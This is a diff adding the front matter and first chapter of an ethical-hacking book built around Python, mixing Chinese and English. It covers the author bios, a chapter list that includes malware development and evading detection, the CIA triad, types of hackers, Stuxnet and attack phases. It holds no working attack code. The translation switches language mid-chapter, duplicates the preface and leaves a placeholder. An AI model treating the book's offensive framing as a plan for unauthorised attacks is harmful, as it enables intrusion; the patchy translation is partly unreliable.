@@ -1,0 +1,1366 @@
+- "# Python 道德黑客从零开始：像道德黑客一样思考，避免被检测，并成功开发、部署、检测和避免恶意软件\n\n\n\n\n\n\n\n## 贡献者\n\n\
+  ### 关于作者\n\n**Fahad Ali Sarwar** 在不同的在线平台上教授道德黑客和渗透测试，拥有扎实的学生基础。他对网络安全和道德黑客工具开发充满热情。\n\
+  \nFahad 特别喜爱 Python 的简洁和易用性，在本书中，他选择专注于 Python，正是因为它所提供的特性。\n\n### 关于审稿人\n\n**Omar\
+  \ Ahmed** 专注于应用程序和网络渗透测试。他曾为各行各业的客户执行过数十次道德黑客任务，涵盖政府、金融、零售和制造业等领域。Omar 拥有独特的机会来评估新应用程序和技术的安全性，范围从支持\
+  \ Web 的电子商务应用程序到专有应用程序。\n\n他的安全职业生涯始于 2012 年，专注于网络和应用程序安全。Omar 在渗透测试、应用程序评估、社会工程（物理和虚拟）、漏洞评估和日志分析方面表现出色。您可以通过\
+  \ Twitter 联系他：@mistspark。\n\n**Marquel Waites** 是一名网络分析师和退伍军人，在美国陆军拥有 21 年的领导经验，未来的职业目标是成为\
+  \ IT 安全总监（CISO）。在充满活力和快节奏的环境中，他带领超过 100 人的组织取得了可衡量的成果。他在财务管理运营、网络安全运营、事件响应协调、安全分析和监控、网络安全政策与技术合规性以及网络安全风险与漏洞管理方面拥有全面的背景。Marquel\
+  \ 在多个方面管理风险，以保护价值超过 2.56 亿美元的资产、财产和设备，同时超越高级行政利益相关者的期望。他曾多次因杰出表现和专业精神而获奖。他的职业背景包括：Trident\
+  \ University 的信息技术管理理学学士学位、Colorado Technical University 的网络安全政策理学硕士学位，以及 EC Council\
+  \ University 的网络安全与云安全架构理学硕士学位。他拥有多项认证，包括道德黑客认证、认证网络防御架构师和 Security+。\n\n> *我要感谢\
+  \ Packt 给我机会审阅这本书，希望这本书能在专业上帮助到每个人。我要感谢 EC Council University 的所有教授和 Coalfire 团队，他们不断激励我成为一名更好的网络安全专业人士。*\n\
+  \n为什么订阅？191\n\n其他您可能喜欢的书\n\n索引\n\n\n\n\n\n## 前言\n\n道德黑客是一个庞大的领域，随着现代组织对网络安全的需求不断增加，道德黑客和渗透测试人员的需求也在迅速增长。本书旨在帮助你在网络安全领域开启你的旅程。Python\
+  \ 是一种通用编程语言，由 Guido van Rossum 于 1991 年开发。自那时起，它获得了巨大的粉丝群。Python 一直被黑客评为最受欢迎和最强大的编程语言，能够将其用于渗透测试是专业人士非常渴望掌握的技能。网络安全有太多内容需要学习，需要多年经验才能掌握这一领域的事物。几乎没有其他领域像网络安全一样变化如此迅速。在本书中，我们将通过学习黑客的基础知识开始我们的旅程，后续章节将重点学习黑客如何构建自己的工具。\n\
+  \n## 本书适合谁\n\n本书适用于那些希望通过自行开发工具来学习道德黑客，而不是仅仅使用预制工具的人；你将学习如何从零开始构建黑客工具。本书也适用于希望深入道德黑客世界的\
+  \ Python 开发者。\n\n## 本书涵盖内容\n\n第 1 章，黑客入门，将帮助你学习黑客的基础知识。\n\n第 2 章，入门 – 设置实验室环境，将帮助你设置实验室环境。\n\
+  \n第 3 章，侦察和信息收集，涵盖了解受害者的内容。\n\n第 4 章，网络扫描，教你如何探索本地网络。\n\n第 5 章，中间人攻击，深入讲解如何攻击本地网络。\n\
+  \n第 6 章，恶意软件开发，涵盖开发自己的恶意软件。\n\n第 7 章，高级恶意软件，探讨开发高级功能。\n\n第 8 章，后渗透，[content]\n\n\
+  ## 前言\n\nEthical hacking is a vast field, and with the increased need for cybersecurity\
+  \ in modern organizations, the demand for ethical hackers and penetration testers\
+  \ is increasing rapidly. This book aims to get you started on your journey in cybersecurity.\
+  \ Python is a general-purpose programming language that was developed by Guido van\
+  \ Rossum in 1991. Since then, it has gained an enormous fanbase. Python is consistently\
+  \ ranked as the most preferred and most powerful programming language by hackers,\
+  \ and being able to use it for penetration testing is a highly desired skill for\
+  \ professionals. There is so much to learn about cybersecurity that it takes many\
+  \ years of experience to get the hang of things in this field. There is hardly any\
+  \ other field that changes as rapidly as cybersecurity. In this book, we will start\
+  \ our journey by learning about the basics of hacking, and later in the book, we\
+  \ will focus on learning how hackers build their own tools.\n\n## Who this book\
+  \ is for\n\nThis book is intended for people who want to learn about ethical hacking\
+  \ by developing tools themselves instead of just using prebuilt tools; you will\
+  \ learn how to build hacking tools from scratch. This book is also intended for\
+  \ Python developers who want to dive into the world of ethical hacking.\n\n## What\
+  \ this book covers\n\nChapter 1, Introduction to Hacking, is where you will learn\
+  \ the fundamentals of hacking.\n\nChapter 2, Getting Started – Setting Up a Lab\
+  \ Environment, sees you set up a lab environment.\n\nChapter 3, Reconnaissance and\
+  \ Information Gathering, covers getting to know the victim.\n\nChapter 4, Network\
+  \ Scanning, teaches you how to explore local networks.\n\nChapter 5, Man in the\
+  \ Middle Attacks, goes into depth on how to attack a local network.\n\nChapter 6,\
+  \ Malware Development, covers developing your own malware.\n\nChapter 7, Advanced\
+  \ Malware, explores developing advanced features.\n\nChapter 8, Post Exploitation,\
+  \ looks at exploiting the victim machine.\n\nChapter 9, System Protection and Perseverance,\
+  \ is all about protecting your system against external attacks.\n\n## To get the\
+  \ most out of this book\n\nTo get the most out of this book, try to follow all the\
+  \ examples included. This book is designed to be hands-on, so practicing the development\
+  \ exercises will help you gain proper insight into attack methodologies. This book\
+  \ assumes that you are familiar with the Python programming language.\n\n| Software/hardware\
+  \ covered in the book | OS requirements |\n|---|---|\n| Python version 3.8 | Windows,\
+  \ macOS X, or Linux |\n| VMware/VirtualBox |  |\n| Visual Studio Code IDE |  |\n\
+  \nIf you are using the digital version of this book, we advise you to type the code\
+  \ yourself or access the code via the GitHub repository (link available in the next\
+  \ section). Doing so will help you avoid any potential errors related to the copying\
+  \ and pasting of code.\n\n## Download the example code files\n\nYou can download\
+  \ the example code files for this book from GitHub at https://github.com/PacktPublishing/Python-Ethical-Hacking.\
+  \ In case there's an update to the code, it will be updated on the existing GitHub\
+  \ repository.\n\nWe also have other code bundles from our rich catalog of books\
+  \ and videos available at https://github.com/PacktPublishing/. Check them out!\n\
+  \n## Download the color images\n\nWe also provide a PDF file that has color images\
+  \ of the screenshots/diagrams used in this book. You can download it here: http://www.packtpub.com/sites/default/files/downloads/9781838829506_ColorImages.pdf.\n\
+  \n## Conventions used\n\nThere are a number of text conventions used throughout\
+  \ this book.\n\nCode in text: Indicates code words in text, database table names,\
+  \ folder names, filenames, file extensions, pathnames, dummy URLs, user input, and\
+  \ Twitter handles. Here is an example: \"This will open a dialog box, and you can\
+  \ select the kali machine ova file you just downloaded.\"\n\nA block of code is\
+  \ set as follows:\n\n```\nsubprocess.run(\n    [\"ifconfig\", \"eth0\"],\n    shell=True,\n\
+  )\n```\n\nAny command-line input or output is written as follows:\n\n```\nsudo dpkg\
+  \ -i /path/to/file\n```\n\n**Bold**: Indicates a new term, an important word, or\
+  \ words that you see onscreen. For example, words in menus or dialog boxes appear\
+  \ in the text like this. Here is an example: \"Press **Yes** and you will see the\
+  \ following screen.\"\n\n**Tips or important notes**\nAppear like this.\n\n## Get\
+  \ in touch\n\nFeedback from our readers is always welcome.\n\n**General feedback**:\
+  \ If you have questions about any aspect of this book, mention the book title in\
+  \ the subject of your message and email us at customercare@packtpub.com.\n\n**Errata**:\
+  \ Although we have taken every care to ensure the accuracy of our content, mistakes\
+  \ do happen. If you have found a mistake in this book, we would be grateful if you\
+  \ would report this to us. Please visit www.packtpub.com/support/errata, selecting\
+  \ your book, clicking on the Errata Submission Form link, and entering the details.\n\
+  \n**Piracy**: If you come across any illegal copies of our works in any form on\
+  \ the Internet, we would be grateful if you would provide us with the location address\
+  \ or website name. Please contact us at copyright@packt.com with a link to the material.\n\
+  \n**If you are interested in becoming an author**: If there is a topic that you\
+  \ have expertise in and you are interested in either writing or contributing to\
+  \ a book, please visit authors.packtpub.com.\n\n## Reviews\n\nPlease leave a review.\
+  \ Once you have read and used this book, why not leave a review on the site that\
+  \ you purchased it from? Potential readers can then see and use your unbiased opinion\
+  \ to make purchase decisions, we at Packt can understand what you think about our\
+  \ products, and our authors can see your feedback on their book. Thank you!\n\n\
+  For more information about Packt, please visit `packt.com`.\n"
+- '# Section 1:
+
+  The Nuts and Bolts
+
+  of Ethical Hacking
+
+  – The Basics
+
+
+  This part of the book deals with the basic concepts you need to understand before
+  embarking on this journey. It deals with the basic knowledge and skillset you need
+  in order to fully take advantage of this book. It gives a short overview of the
+  field of ethical hacking and what it entails.
+
+
+  This part of the book comprises the following chapters:
+
+
+  - Chapter 1, Introduction to Hacking
+
+  - Chapter 2, Getting Started – Setting Up a Lab Environment
+
+  '
+- "# 1\nIntroduction\nto Hacking\n\nThis chapter will give you a quick introduction\
+  \ to the nuts and bolts of hacking. You will start exploring what the world of hacking\
+  \ entails and what it really takes to become a hacker. You will learn about what\
+  \ skill set is needed to become a successful hacker in the real world. We will also\
+  \ discuss some legal aspects of hacking and penetration testing and how you can\
+  \ avoid getting into legal trouble. Then, we will explore what the different kinds\
+  \ of hackers are and what categories they fall into. In the later sections of this\
+  \ chapter, we will explore the general steps and guidelines we should follow in\
+  \ order to carry out a successful attack. Lastly, we will conclude this chapter\
+  \ by talking about different attack vectors. We will talk about both technical and\
+  \ personal penetration testing techniques.\n\nIn this chapter, the following topics\
+  \ will be covered:\n\n- What's all the fuss about hackers?\n- What is hacking?\n\
+  - Becoming a successful hacker\n- Types of hackers\n- Hacking phases and methodology\n\
+  - Careers in cybersecurity\n- Types of attacks\n\n> **Disclaimer**\n> All the information\
+  \ provided in this book is purely for educational purposes. The book aims to serve\
+  \ as a starting point for learning penetration testing. Use the information provided\
+  \ in this book at your own discretion. The author and publisher hold no responsibility\
+  \ for any malicious use of the work provided in this book and cannot be held responsible\
+  \ for any damages caused by the work presented in this book.\n> \n> Penetration\
+  \ testing or attacking a target without previous written consent is illegal and\
+  \ should be avoided at all costs. It is the reader's responsibility to be compliant\
+  \ with all their local, federal, state, and international laws.\n\n## What's all\
+  \ the fuss about hackers?\n\nWhat comes to your mind when you think of the word\
+  \ hacker? In recent decades, the word hacker has almost become synonymous with the\
+  \ notion of a genius computer nerd who can get access to any system within seconds\
+  \ and can control anything. From someone who can control traffic signals through\
+  \ their computer to someone penetrating the Pentagon's network, the world of movies\
+  \ and fiction has created a specific image of a hacker. Like everything else in\
+  \ movies, this is just a work of fiction; the real world of hacking and penetration\
+  \ testing is quite different and vastly more complex and challenging.\n\nThe real\
+  \ world is filled with unknowns. Carrying out a successful attack on a victim requires\
+  \ a lot of patience, hard work, dedication, and probably a bit of luck. The world\
+  \ of computer security and hacking is a constant cat-and-mouse chase. Developers\
+  \ create a product, hackers try to break it and find vulnerabilities and exploit\
+  \ them, developers find out about these vulnerabilities and develop a patch for\
+  \ them, hackers find new vulnerabilities, and this cycle continues. Both actors\
+  \ try to outsmart each other in this constant race. With each iteration, the process\
+  \ becomes more and more complex, and attacks are becoming more and more sophisticated\
+  \ to bypass detection mechanisms. Similarly, detection mechanisms are also getting\
+  \ smarter and smarter. You can clearly see a pattern here.\n\n\n\n\n\n以下列出的术语将在后续章节中使用。在深入了解细节时，熟悉这些术语是必要的。在阅读有关渗透测试的文献时，你经常会看到一个术语，即\
+  \ CIA 三要素（代表 **机密性、完整性和可用性**）：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_18_0.png)\n\
+  \n图 1.1 – CIA 三要素\n\n黑客过程的大多数方面都涉及破坏其中一个或多个方面。让我们详细探讨这些术语。\n\n## 机密性\n\n机密性是指组织试图对其数据保持私密。这意味着在组织内部，没有人可以在未经授权的情况下访问数据。通常组织会有访问控制，规定每个用户对其数据的访问级别。访问级别通常分为以下几类：\n\
+  \n| 实体 | 访问级别 | 谁 |\n|---|---|---|\n| Guests | 对组织的访问权限非常低 | 通常不是组织一部分的人拥有访客访问权限。\
+  \ |\n| Users | 中等 – 能够使用基础设施但无法修改它 | 组织的普通员工，需要对基础设施进行非常基础访问的人。 |\n| Admins | 高级别\
+  \ | 管理员通常是高级管理人员和 IT 人员。 |\n| Root/super user | 完全控制 | 这些人大多对组织的基础设施拥有完全控制权。 |\n\
+  \n当人们获得他们不应该访问的基础设施访问权限时，机密性就会被违反，例如，公司前员工使用之前的凭证登录系统，或访客在网络中获得不必要的更高访问级别。为了确保机密性，必须实施严格的控制以避免违反机密性标准。即使某人访问了公司数据但没有造成任何损害，机密性也会被违反。请看下面的例子：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_19_0.png)\n\n图 1.2 – 机密性被违反\n\n假设 John\
+  \ 在一个网络上向 Jack 发送一条消息。这条消息仅 intended for Jack，其他人不得查看。该网络与各种用户共享。未知人士 Mr. X 也在网络中，他正在监听网络上的所有流量（也称为嗅探）。机密性原则表明只有\
+  \ Jack 才能解码这条消息。如果 Mr. X 拦截了这个数据包，阅读它，然后在不修改消息内容的情况下将其转发给 Jack，即使 John 和 Jack 都不知道他们的流量被拦截，机密性原则也被认为被违反了。网络嗅探/监控违反了机密性原则。\n\
+  \n## 完整性\n\n完整性原则确保数据未以任何形式被篡改并且是可靠的。数据完整性应在静态和事务模式下都得到保证。静态完整性意味着系统中的所有文件都保持完整，任何未经授权的修改都应立即被检测到。它还要求在传输介质上传输时保持数据完整性。用于确保数据完整性的技术各不相同。其中最常见的例子是使用校验和。校验和是为文件计算的一串字符，以确保其未被修改。你经常会在从互联网下载的文件中看到校验和。文件下载后，你可以计算校验和并将其与网站上的校验和进行比较；如果两者相等，则意味着下载过程中数据完整性得以保持。如果在下载过程中即使一个比特被更改，整个校验和字符串也会发生变化。它通常用于防止文件欺骗/伪装攻击，即黑客拦截你的下载请求，而非下载你请求的文件，而是将恶意恶意软件下载到你的电脑。你应始终比较文件的校验和，以确保你下载的文件确实与服务器上的文件相同。\n\
+  \n为了更好地理解完整性原则，让我们看一下下面的例子：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_20_0.png)\n\
+  \n图 1.3 – 完整性原则被违反\n\n假设 John 向 Jack 发送一条消息，称他们应在下午 4 点会面。Mr. X 再次以一种使这两者之间所有流量都经过\
+  \ Mr. X 的方式拦截网络流量。Mr. X 阅读了 John 的消息，将时间从下午 4 点改为下午 6 点，然后将消息发送给 Jack。Jack 收到消息后认为\
+  \ John 想在下午 6 点而不是下午 4 点会面。Jack 没有办法知道实际消息。在这种情况下，完整性和机密性原则都被违反了。Mr. X 能够读取和更改数据。\n\
+  \n## 可用性\n\n可用性的最后一个原则要求数据在授权用户请求时可用。**拒绝服务 (DoS)** 攻击违反了这一原则。在 DoS 攻击中，攻击者试图用请求洪流使系统不堪重负，从而使服务器/系统对合法用户不可用。这是网站上最常见的攻击之一。攻击者用请求轰炸网站服务器，最终使其瘫痪。为了遏制\
+  \ DoS 攻击，现在通常会设置几秒钟的等待时间来处理请求。可用性 simply 意味着网络、系统和服务器在用户需要时在线。即使中断几分钟，也会对组织造成严重破坏。让我们用同一个例子来更好地理解这一点：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_21_0.png)\n\n图 1.4 – 通过 DoS 违反可用性\n\n\
+  假设 John 再次在 Mr. X 正在拦截的同一网络上向 Jack 发送消息。John 向 Jack 发送消息称在下午 4 点会面。然而，Mr. X 拦截了这条消息并未将其转发。John\
+  \ 认为消息已发送。然而，Jack 将永远收不到这条消息。在这种情况下，可用性原则被违反了，因为消息对 Jack 不可用。违反可用性原则的另一种变体是延迟消息。假设\
+  \ John 向 Jack 发送一条紧急消息，关于必须在特定时间范围内完成的某些任务。Mr. X 延迟了消息，使得消息在该时间范围过去后才被 Jack 收到。即使\
+  \ John 收到了正确的消息，延迟也使消息变得毫无用处。这也是对可用性原则的严重违反。\n\n为了保持系统安全可靠，CIA 三要素非常重要。每位网络安全专家的目标都是根据\
+  \ CIA 特征维护系统。任何对这些原则的违反都会导致系统网络安全被破坏。接下来，让我们看看成为一名成功的黑客需要什么。\n\n## 成为一名成功的黑客\n\n\
+  为了成为一名成功的渗透测试员，你需要特定的技能集。\n你首先需要的是强烈的学习新技术的渴望。计算世界正在以非常快的速度变化，每隔几年，老工具和技术就会被取代。你不能使用一次成功的漏洞利用并期望它在\
+  \ 10 年后仍然有用。本书将主要关注开发你自己的工具。你将无法用本书中开发的工具黑进 NASA，这也不是本书的想法。本书旨在作为你的起点。本书中描述的技术和工具的知识将帮助你入门，然后一切皆有可能。\n\
+  \n为了在这一领域取得成功，你首先需要的是对计算机系统和计算机网络的了解。没有它们，你将无法取得很大进展。本书假设你熟悉计算机网络等。当必要时，新术语将被解释。本书还假设你对\
+  \ Python 编程语言有基本了解。我们将在本书中使用 Python 3。\n\n对这两个组件的知识应该足以跟随本书。渗透测试的世界相当庞大，要成为一名脱颖而出的黑客，你需要掌握大量技术。这包括\
+  \ Linux、数据库、硬件和内存访问、逆向工程、密码学、网络和分析技能。如果你想成功，你应该主动并能够快速思考。\n\n今天大多数系统都是在线的，基于网络的黑客攻击是渗透测试中最普遍的形式之一。这意味着要成为一名渗透测试员，了解网络如何工作是必不可少的。对基于网络的技术如\
+  \ HTML、JavaScript、PHP 和 SQL 的基本知识是必不可少的。这些主题不会在本書中涵盖，因为它们不属于本书的范围；然而，在实际生活中，这些工具的知识对渗透测试非常有用。\n\
+  \n一名成功的道德黑客所需的关键技能之一是像黑客一样思考。那么，*像黑客一样思考*意味着什么？黑客的目标是入侵系统。计算机系统以直观的方式设计，因此大多数人只需付出最小的努力就能与其交互。系统的所有安全方面都是以这种方法论为基础设计的。为了能够入侵系统，你的思维过程应该有点反直觉或更具创造性。你需要能够识别可被攻击的弱点，从而帮助你攻破系统。\n\
+  \n\n\n\n\n创建一种能够帮助你攻击某个系统的工具是黑客过程的一方面，而能够在不被检测到的情况下成功地将你的恶意软件部署到目标系统则是方程的另一半。这几乎和黑客工具本身一样重要。一旦你确定了目标，你的目标就是思考一种可以将其部署到系统的方法论。部署代码的方法有很多，这取决于你能获得系统的何种访问权限。这些方法，例如钓鱼和特洛伊木马，将在后面讨论。如果你对这些术语感到陌生也不用担心。读完这本书后，你将熟悉其中大多数术语。\n\
+  \n黑客需要你不断跟上新技术的发展。网络安全领域的格局变化非常迅速，你需要精通这些变化。一个好主意是关注专门讨论这些问题的论坛和网站。每天都有数百个漏洞被发现并得到修复；你需要在正确的时间出现在正确的地方以利用它们。机会窗口往往非常小。网络安全领域常用的一种术语是零日漏洞。零日漏洞是指尚未得到修补的漏洞。通常，只有极少数人知道这些漏洞，而且他们往往不会披露，以便最大化利用。一旦漏洞公开，很可能很快就会被修补，在某些情况下甚至只需几天。\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_23_0.png)\n\n图 1.5 – 黑客技能金字塔\n\n上图显示了根据道德黑客专业程度划分的技能金字塔。达到顶峰需要经验、分析技能以及最重要的计算机系统的深入知识的结合。\n\
+  \n## 合法性\n\n渗透测试的经验法则是，你不应攻击你不被允许攻击的系统。即使你在一家网络安全公司担任渗透测试员，你也必须获得书面许可才能测试系统的安全性。如果没有书面同意，你可能会陷入严重的法律麻烦。渗透测试通常涉及使用不同的攻击向量攻击系统，这通常会导致系统崩溃。如果你没有事先许可，你将对对其基础设施造成的损害承担责任。\n\
+  \n渗透测试涵盖了各种各样的测试。在实际案例中，用于测试的书面同意合同必须明确定义测试范围。它应提及将执行何种类型的测试以及测试中将针对哪些系统/资产。测试应严格限定在这些预定义的目标范围内。例如，除非明确提及，否则对软件代码的测试不应包括网络安全测试。\n\
+  \n渗透测试可以在生产或实时系统上进行。如果被测试的资产是实时系统，用户必须就测试及其潜在损害得到适当通知。渗透测试在不同的环境中进行。有时组织中的用户知道正在进行渗透测试，而在其他情况下，只有高层管理知道，以便测试哪些个人对组织构成潜在威胁。如果组织中的用户已经知道将进行渗透测试，最好提前通知他们测试时间，以免干扰组织的日常活动。接下来，让我们了解黑客的类型。\n\
+  \n## 黑客类型\n\n如前所述，黑客一词附带了一个特定的形象。然而，在现实生活中，黑客根据其执行的操作类型被分为不同的类别。在接下来的章节中，我们将解释不同类型的黑客，他们需要什么样的经验，以及与每种类型相关的法律方面。\n\
+  \n### 白帽黑客\n\n*Aim:* 防御组织免受外部和恶意攻击，保护其业务和资产。\n\n白帽黑客是指网络安全专家或渗透测试员，其目标是测试信息系统的安全性。他们也被称为*道德黑客*或*好人*。他们的意图是防御稍后将讨论的恶意黑客。白帽黑客使用相同的工具和技术，并具有相同的入侵系统专业知识。唯一的区别在于他们的意图。他们的目标是增强系统的强度并保护其免受外部攻击。\n\
+  \n本书旨在帮助你成为一名道德黑客并帮助提高系统的安全性。成为一名成功的道德黑客需要多年的技术学习经验、理解黑客思维过程以及耐心。网络安全分析师和渗透测试员是计算机科学领域薪资最高的职位之一。\n\
+  \n### 黑帽黑客\n\n*Aim:* 怀有恶意意图入侵系统。\n\n黑帽黑客通常是罪犯，其动机是获得经济利益或出于个人、机构或国家目标而对某人造成伤害。黑帽黑客尽可能隐藏自己的身份；他们大多使用化名来识别自己。怀有恶意意图的黑客行为在大多数国家都是非法的。黑帽黑客很难在系统中被检测到，除非他们选择暴露自己。很多时候，他们在资产的实际所有者不知道的情况下保持对系统的远程访问。他们也很擅长掩盖自己的踪迹。他们中的大多数只在造成损害后才暴露自己。很多时候，黑帽黑客是不同犯罪组织的一部分。这使他们更难被抓获。\n\
+  \n严格来说，*黑帽黑客*是指其主要目标是经济利益的人。*黑帽黑客*一词源于在旧西部电影中，坏人经常戴黑帽子，因此使用黑帽来指代黑客的惯例变得流行。\n\n###\
+  \ 灰帽黑客\n\n*Aim:* 个人动机或为好玩。\n\n现实世界不是二元的，黑客也不是。*灰帽*指的是在某种模糊地带运作的黑客。他们拥有与白帽或黑帽黑客相同的技能；然而，他们的动机通常不是财务上的。灰帽黑客喜欢为了好玩和享受而在系统中玩弄。大多数时候，他们是无害的，甚至会向负责人员暴露系统漏洞。他们之所以入侵系统，只是因为他们能做到。\n\
+  \n灰帽黑客也喜欢在系统中窥探，测试其强度，一旦发现潜在弱点，他们通常会通知管理员并提供付费服务来纠正问题。这是他们赚钱的一种方式。这种做法的合法性值得怀疑；然而，对一些人来说，这是一种赚取可观收入的方式。\n\
+  \n如前所述，灰帽黑客和黑帽黑客之间的界限相当模糊。你应该非常小心。一次错误或误算可能导致重大问题。灰帽黑客最终跨入黑帽类别的危险也存在。\n\n这些是黑客的三个主要类别。然而，在现实生活中，还有其他术语使用，具体取决于你问谁，它们可能落入这些类别之一。很难将它们归类到单一类别，因此它们将在下一节中单独提及。\n\
+  \n### 国家黑客\n\n*Aim:* 攻击敌人的网络资产。\n\n随着国家对基于计算机系统的依赖增加，保护和攻击网络系统变得极其重要。随着传统战争手段变得越来越强大和有限，网络战的使用变得越来越重要。*国家黑客*一词用于指一支专注于破坏敌对国家网络资产的黑客团队。\n\
+  \n国家或*国家支持的黑客*的历史可以追溯到计算的早期。国家长期以来一直将黑客作为实现其战略目标的手段。国家支持黑客的工作是渗透敌方系统，获取信息，为远程控制植入后门，甚至破坏其关键基础设施。在这方面已经进行了多次高调的尝试，而且威胁非常真实。只要想象一下，如果敌对国家控制了某人的核电站会发生什么。这并不是科幻电影中的情节。这在现实生活中也发生过。\n\
+  \n\n\n\n以感染伊朗核设施的*震网*病毒为例。震网是一种非常复杂的恶意软件，感染了**监控与数据采集（SCADA）**系统。SCADA系统用于监控和控制大型工业系统。该病毒利用了设施中**可编程逻辑控制器（PLC）**的一个漏洞。该恶意软件非常隐蔽，只有当目标系统是伊朗核设施时才会激活。尽管它感染了大量计算机系统，但大部分时间处于休眠状态，只有在到达预定目标时才会激活。根据大多数研究人员的说法，这次攻击的复杂性表明，它并非某个犯罪组织所为，而是需要一个高度专业化的程序员团队花费数月时间开发。这类资源通常只有国家级黑客才能动用。震网控制了离心机速度控制信号，并以极高的速度旋转离心机，最终导致其故障。震网还截获发往SCADA系统的速度状态消息，让这些系统以为离心机正以正常速度运行，而实际上它们的转速要高得多。这使得震网很难被检测到，并在相当长一段时间内未被发现，阻碍了该设施的核进展，最终在2010年被发现。\n\
+  \n## 商业间谍\n\n*目标：* 获得竞争优势。\n\n公司的大量商业价值在于其拥有的**知识产权（IP）**。这种知识产权有时决定了公司的价值。近年来，公司一直是*商业攻击*的目标，有人试图窃取其知识产权。随着商业世界竞争加剧，商业间谍活动正变得司空见惯。公司经常受到*商业黑客*的攻击，这些黑客旨在窃取敏感信息，包括知识产权、商业计划、专利、财务数据和客户数据，以获得竞争优势。这些攻击可能直接来自竞争对手，也可能由竞争对手雇佣专业黑客实施。\n\
+  \n这类黑客通常属于黑帽类别。然而，由于黑客攻击的性质，他们有时被归为单独的一类。商业黑客的唯一区别在于其主要目标通常是竞争对手，而在其他情况下，目标可能是任何人。\n\
+  \n## 黑客行动主义者\n\n*目标：* 发表政治/社会声明。\n\n黑客行动主义者一词由*行动主义者*和*黑客*两个词组合而成。这类攻击通常是为了发表政治声明。这些黑客的目标是呼吁社会变革或引起人们对某些问题的关注。与尽量隐匿行踪的黑帽黑客不同，黑客行动主义者试图在隐藏真实身份的同时获得最大关注。他们的目标是将信息传播给大众。在大多数黑客行动主义案例中，黑客没有经济动机。他们使用与其他黑客相同的工具和技术。黑客行动主义是政治抗议的数字对应物。随着政治格局的变化，政治正在进军数字空间，黑客行动主义为一些人提供了发表声明的途径。\n\
+  \n黑客行动主义者使用不同方法吸引注意。有时他们会破坏服务，例如对公司或政府网站发起DoS攻击。其他时候，他们获取关键敏感信息，并将这些机密信息泄露给公众，使政府或公司陷入极大尴尬。近年来重大泄密事件之一是维基解密风波。\n\
+  \n这里需要注意的一点是，从法律角度看，黑客行动主义与黑帽黑客行为没有区别。即使你为了崇高事业参与某些活动而被抓住，你也会像黑帽黑客一样受到同等罪名的审判。因此，许多黑客倾向于保持匿名，并在行动中使用化名。\n\
+  \n与黑客行动主义相关的最著名黑客组织之一是*匿名者*。据称，他们对多个政府组织发动了多次攻击，以表达对某项事业的支持或对某些立法的反对。匿名者自称是一个去中心化组织，人们汇聚在一起支持共同事业。他们常被称为数字范式中的*自由斗士*和*罗宾汉*。这个集体的去中心化特性意味着打击它变得非常困难：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_28_0.png)\n\n图1.6 – 匿名者相关的标志\n\n不同个人和小型组织声称负责管理该组织的运作；然而，这个组织的真实性质仍是一个谜。还有其他组织，如LulzSec和Fancy\
+  \ Bear，它们的运作性质更为专注，给网络安全专业人员带来了巨大困难。\n\n## 脚本小子\n\n在网络安全领域，*脚本小子*一词指的是初学者黑客，他们通常对网络安全或一般性的黑客技术没有深入了解。他们往往倾向于使用预先构建的工具进行黑客攻击，很像黑盒方法。他们本质上并不了解黑客工具的内部工作原理，只是使用它。脚本小子有时缺乏编程知识来构建自己的工具，并依赖现有工具进行黑客攻击。*脚本小子*这个术语源于他们使用预先构建的*脚本*或程序来实施攻击。\n\
+  \n脚本小子经常获取诸如*反向Shell*之类的黑客工具，并通过观看互联网教程来部署它。他们的目标不是学习过程，而是达到最终目标——控制目标系统。只要工具能用，他们就不关心它是如何工作的。\n\
+  \n网络安全专业人员常犯的一个错误是不把脚本小子当回事。即使是脚本小子精心部署的攻击也可能对资产造成巨大损害。攻击者要成功实施攻击，并不需要了解所用脚本的每个细节。只要攻击角度合适，就足以发动一次成功的攻击。网上有大量免费和付费的工具可供使用，帮助人们实施攻击。有些黑客组织专门制作这些工具，卖给脚本小子用于攻击。因此，不要认为对工具开发知之甚少的人不构成威胁。事实上，他们和经验丰富的黑客一样具有威胁性。攻击的成功既取决于攻击者，也取决于所使用的工具。\n\
+  \n## 黑客攻击阶段与方法论\n\n获得所需知识后，黑客攻击过程就开始了。与任何其他组织有序的任务一样，黑客攻击也有其自身的步骤顺序，必须遵循这些步骤才能成功实施攻击。现实中的黑客攻击是一个艰苦的过程，需要做大量工作。从收集信息到攻击，再到清除痕迹，每一步都需要完美执行。任何一个失误都可能暴露你的身份，破坏整个过程。图1.7展示了将在后续详细讨论的黑客攻击的不同阶段：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_30_0.png)\n\n图1.7 – 黑客攻击步骤\n\n在接下来的章节中，我们将详细探讨每个步骤。\n\
+  \n## 规划\n\n任何事情的第一步都是恰当规划。花时间进行恰当规划可能会节省因规划不当而浪费的大量时间。规划的重要性怎么强调都不为过。在下一章中，我们将重点讨论渗透测试方法论，即测试入侵系统或网络的难易程度。我们将对一个名为*知名组织有限公司*的虚构组织发起攻击，在组织内部，我们将聚焦于一个虚构人物，称他为*目标先生*。在专业的渗透测试方案中，你需要在规划过程中创建合适的工作流程，并以有序的方式保留过程中获得的所有相关信息，用于报告目的。\n\
+  \n下一步是确定要攻击的目标人员或系统。从渗透测试的角度来看，我们在此将定义测试范围、包含内容、限制等。在执行渗透测试之前，我们应确保被测系统已准备好进行测试。这包括确保测试不会导致组织关键基础设施崩溃。\n\
+  \n在开始渗透测试项目之前，还应明确说明将由谁执行攻击以及将有何种监督。应清晰界定渗透测试包含和不包含的边界。应事先妥善说明测试目标和时间表。渗透测试应与公司目标保持一致。在某些情况下，还会测试模拟场景，以了解攻击将如何影响公司的日常运营。规划阶段还应确定需要哪种类型的渗透测试。\n\
+  \n## 侦察\n\n一旦确定了目标并完成规划阶段，我们就开始渗透测试过程。简而言之，侦察意味着收集有关目标个人及组织的信息。在执行任何渗透攻击之前，我们的目标是尽可能多地获取有关目标的信息。我们掌握的目标信息越多，成功实施攻击的机会就越多。信息收集有两种方法，如下所示：\n\
